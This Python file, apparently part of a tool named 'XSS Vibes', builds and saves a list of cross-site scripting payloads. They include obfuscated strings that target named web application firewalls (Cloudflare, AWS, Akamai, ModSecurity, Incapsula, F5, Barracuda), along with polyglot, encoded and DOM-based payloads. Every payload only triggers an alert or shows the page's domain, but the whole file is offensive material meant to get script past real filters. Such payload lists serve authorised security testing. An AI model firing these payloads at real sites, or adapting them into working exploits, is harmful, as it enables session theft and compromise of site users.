"""Advanced payload generator for XSS Vibes."""

import json
import base64
from pathlib import Path
from typing import List, Dict, Any


class AdvancedPayloadGenerator:
    """Generator for advanced XSS payloads."""

    def __init__(self):
        """Initialize payload generator."""
        self.payloads = []

    def generate_waf_bypass_payloads(self) -> List[Dict[str, Any]]:
        """Generate WAF-specific bypass payloads."""

        # CloudFlare bypasses
        cloudflare_payloads = [
            {
                "Payload": "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
                "Attribute": ["<", ">", "/", "=", "(", ")", ","],
                "waf": "cloudflare",
                "count": 0,
                "description": "CloudFlare bypass using String.fromCharCode",
                "level": "critical",
            },
            {
                "Payload": "<img src=x onerror=Function('r','e','t','u','r','n',' ','a','l','e','r','t')()('XSS')>",
                "Attribute": ["<", ">", "=", "(", ")", "'", ","],
                "waf": "cloudflare",
                "count": 0,
                "description": "CloudFlare Function constructor bypass",
                "level": "critical",
            },
            {
                "Payload": '<iframe srcdoc="&lt;svg onload&equals;self&lbrack;&apos;ale&apos;&plus;&apos;rt&apos;&rbrack;&lpar;&apos;XSS&apos;&rpar;&gt;">',
                "Attribute": [
                    "<",
                    ">",
                    "=",
                    '"',
                    "&",
                    ";",
                    "[",
                    "]",
                    "+",
                    "(",
                    ")",
                    "'",
                ],
                "waf": "cloudflare",
                "count": 0,
                "description": "CloudFlare HTML entity bypass with string concatenation",
                "level": "critical",
            },
        ]

        # AWS WAF bypasses
        aws_payloads = [
            {
                "Payload": "<svg><script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))</script>",
                "Attribute": ["<", ">", "(", ")", "'", "="],
                "waf": "aws",
                "count": 0,
                "description": "AWS WAF base64 bypass",
                "level": "critical",
            },
            {
                "Payload": "<img src=1 onerror=window[atob('ZXZhbA==')](atob('YWxlcnQoMSk='))>",
                "Attribute": ["<", ">", "=", "[", "]", "(", ")", "'"],
                "waf": "aws",
                "count": 0,
                "description": "AWS WAF double base64 bypass",
                "level": "critical",
            },
        ]

        # Akamai bypasses
        akamai_payloads = [
            {
                "Payload": "<svg/onload=eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')>",
                "Attribute": ["<", ">", "/", "=", "(", ")", "'", "\\", "x"],
                "waf": "akamai",
                "count": 0,
                "description": "Akamai hex encoding bypass",
                "level": "critical",
            },
            {
                "Payload": "<img src=x onerror=self['\\u0065\\u0076\\u0061\\u006c']('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029')>",
                "Attribute": ["<", ">", "=", "[", "]", "'", "\\", "u", "(", ")"],
                "waf": "akamai",
                "count": 0,
                "description": "Akamai unicode escape bypass",
                "level": "critical",
            },
        ]

        # ModSecurity bypasses
        modsecurity_payloads = [
            {
                "Payload": "<svg><script>setTimeout(function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41))},1)</script>",
                "Attribute": ["<", ">", "(", ")", "{", "}", ","],
                "waf": "modsecurity",
                "count": 0,
                "description": "ModSecurity setTimeout bypass",
                "level": "critical",
            },
            {
                "Payload": "<img src=x onerror=this[String.fromCharCode(99,111,110,115,116,114,117,99,116,111,114)](String.fromCharCode(97,108,101,114,116,40,49,41))()>",
                "Attribute": ["<", ">", "=", "[", "]", "(", ")", ","],
                "waf": "modsecurity",
                "count": 0,
                "description": "ModSecurity constructor bypass with charCode",
                "level": "critical",
            },
        ]

        # Incapsula bypasses
        incapsula_payloads = [
            {
                "Payload": "<svg><script>top[String.fromCharCode(101,118,97,108)](String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
                "Attribute": ["<", ">", "[", "]", "(", ")", ","],
                "waf": "incapsula",
                "count": 0,
                "description": "Incapsula top window bypass",
                "level": "critical",
            },
            {
                "Payload": '<iframe src="data:text/html,<script>parent[String.fromCharCode(97,108,101,114,116)](1)</script>">',
                "Attribute": ["<", ">", "=", '"', ":", ",", "[", "]", "(", ")"],
                "waf": "incapsula",
                "count": 0,
                "description": "Incapsula iframe parent bypass",
                "level": "critical",
            },
        ]

        # F5 ASM bypasses
        f5_payloads = [
            {
                "Payload": "<svg><script>Function('ale'+'rt(1)')()</script>",
                "Attribute": ["<", ">", "(", ")", "'", "+"],
                "waf": "f5",
                "count": 0,
                "description": "F5 ASM string concatenation bypass",
                "level": "critical",
            },
            {
                "Payload": "<img src=x onerror=window['ev'+'al']('al'+'ert(1)')>",
                "Attribute": ["<", ">", "=", "[", "]", "'", "+", "(", ")"],
                "waf": "f5",
                "count": 0,
                "description": "F5 ASM window property bypass",
                "level": "critical",
            },
        ]

        # Barracuda bypasses
        barracuda_payloads = [
            {
                "Payload": "<svg><script>self['\\u0065val']('\\u0061lert(1)')</script>",
                "Attribute": ["<", ">", "[", "]", "'", "\\", "u", "(", ")"],
                "waf": "barracuda",
                "count": 0,
                "description": "Barracuda unicode bypass",
                "level": "critical",
            }
        ]

        # Combine all WAF-specific payloads
        all_payloads = (
            cloudflare_payloads
            + aws_payloads
            + akamai_payloads
            + modsecurity_payloads
            + incapsula_payloads
            + f5_payloads
            + barracuda_payloads
        )

        return all_payloads

    def generate_polyglot_payloads(self) -> List[Dict[str, Any]]:
        """Generate polyglot XSS payloads that work in multiple contexts."""

        polyglots = [
            {
                "Payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
                "Attribute": [
                    "j",
                    "a",
                    "V",
                    "s",
                    "C",
                    "r",
                    "i",
                    "p",
                    "t",
                    ":",
                    "/",
                    "*",
                    "-",
                    "`",
                    "\\",
                    "'",
                    '"',
                    "(",
                    ")",
                    "=",
                    "%",
                    "0",
                    "D",
                    "A",
                    "d",
                    "<",
                    ">",
                    "!",
                    "x",
                    "3",
                    "c",
                    "S",
                    "g",
                    "N",
                    "l",
                    "o",
                ],
                "waf": None,
                "count": 0,
                "description": "Universal polyglot XSS payload",
                "level": "critical",
            },
            {
                "Payload": '\'">><marquee><img src=x onerror=confirm(1)></marquee>" onmouseover=prompt(1) onclick=alert(1)>',
                "Attribute": ["'", '"', ">", "<", "=", "(", ")"],
                "waf": None,
                "count": 0,
                "description": "Multi-context polyglot",
                "level": "critical",
            },
            {
                "Payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
                "Attribute": [
                    "j",
                    "a",
                    "v",
                    "s",
                    "c",
                    "r",
                    "i",
                    "p",
                    "t",
                    ":",
                    "/",
                    "*",
                    "-",
                    ">",
                    "<",
                    '"',
                    "'",
                    "+",
                    "[",
                    "]",
                    "(",
                    ")",
                    "=",
                ],
                "waf": None,
                "count": 0,
                "description": "JavaScript protocol polyglot",
                "level": "critical",
            },
        ]

        return polyglots

    def generate_obfuscated_payloads(self) -> List[Dict[str, Any]]:
        """Generate heavily obfuscated payloads."""

        obfuscated = [
            {
                "Payload": "<svg><script>(_=>[_+_][+_]+[_+_+''][+_]+'r'+(![]+_)[+!+_+!+_+!+_]+(![]+_)[+!+_+!+_]+'('+(+_+'')[+_]+')'+'')()&amp;&amp;alert(1)</script>",
                "Attribute": [
                    "<",
                    ">",
                    "(",
                    ")",
                    "=",
                    "[",
                    "]",
                    "+",
                    "_",
                    "'",
                    "!",
                    "&",
                ],
                "waf": None,
                "count": 0,
                "description": "JSFuck style obfuscation",
                "level": "critical",
            },
            {
                "Payload": '<img src=x onerror="eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,97,40,41,123,97,108,101,114,116,40,49,41,125,97,40,41))">',
                "Attribute": ["<", ">", "=", '"', "(", ")", ","],
                "waf": None,
                "count": 0,
                "description": "Char code obfuscated function",
                "level": "critical",
            },
            {
                "Payload": "<svg><script>eval(unescape('%66%75%6e%63%74%69%6f%6e%20%61%28%29%7b%61%6c%65%72%74%28%31%29%7d%61%28%29'))</script>",
                "Attribute": [
                    "<",
                    ">",
                    "(",
                    ")",
                    "%",
                    "6",
                    "5",
                    "c",
                    "8",
                    "1",
                    "2",
                    "f",
                    "3",
                    "4",
                    "a",
                    "7",
                    "b",
                    "d",
                ],
                "waf": None,
                "count": 0,
                "description": "URL encoded obfuscation",
                "level": "critical",
            },
        ]

        return obfuscated

    def generate_dom_based_payloads(self) -> List[Dict[str, Any]]:
        """Generate DOM-based XSS payloads."""

        dom_payloads = [
            {
                "Payload": "#<img src=x onerror=alert(1)>",
                "Attribute": ["#", "<", ">", "=", "(", ")"],
                "waf": None,
                "count": 0,
                "description": "Hash-based DOM XSS",
                "level": "high",
            },
            {
                "Payload": "javascript:void(0);alert(String.fromCharCode(88,83,83))",
                "Attribute": [
                    "j",
                    "a",
                    "v",
                    "s",
                    "c",
                    "r",
                    "i",
                    "p",
                    "t",
                    ":",
                    "(",
                    ")",
                    ";",
                    ",",
                ],
                "waf": None,
                "count": 0,
                "description": "JavaScript void with alert",
                "level": "critical",
            },
            {
                "Payload": "data:text/html,<script>alert(opener?opener.document.domain:document.domain)</script>",
                "Attribute": ["d", "a", "t", ":", "/", "<", ">", "(", ")", "?", "."],
                "waf": None,
                "count": 0,
                "description": "Data URI with opener check",
                "level": "critical",
            },
        ]

        return dom_payloads

    def add_to_payload_file(self, payload_file: Path = Path("payloads.json")):
        """Add generated payloads to the payload file."""

        # Load existing payloads
        existing_payloads = []
        if payload_file.exists():
            with open(payload_file, "r") as f:
                existing_payloads = json.load(f)

        # Generate new payloads
        new_payloads = []
        new_payloads.extend(self.generate_waf_bypass_payloads())
        new_payloads.extend(self.generate_polyglot_payloads())
        new_payloads.extend(self.generate_obfuscated_payloads())
        new_payloads.extend(self.generate_dom_based_payloads())

        # Combine and save
        all_payloads = existing_payloads + new_payloads

        with open(payload_file, "w") as f:
            json.dump(all_payloads, f, indent=2)

        print(f"✅ Added {len(new_payloads)} advanced payloads to {payload_file}")
        return len(new_payloads)


if __name__ == "__main__":
    generator = AdvancedPayloadGenerator()
    count = generator.add_to_payload_file()
    print(f"🚀 Total advanced payloads added: {count}")
